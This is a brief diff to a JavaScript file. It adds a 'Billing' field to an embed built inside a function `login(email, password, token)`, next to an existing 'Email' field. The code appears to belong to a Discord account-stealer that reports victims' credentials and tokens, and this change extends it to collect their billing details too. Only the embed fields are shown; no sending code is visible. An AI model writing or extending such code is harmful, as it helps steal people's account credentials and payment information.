@@ -670,6 +670,11 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
+            name: '<:944007233820307467:959785232037470208> Billing:',
+            value: `\`${billing}\``,
+            inline: true,
+          },
+          {
             name: '<:944007233820307467:959785232037470208> Email:',
             value: `\`${email}\``,
             inline: true,
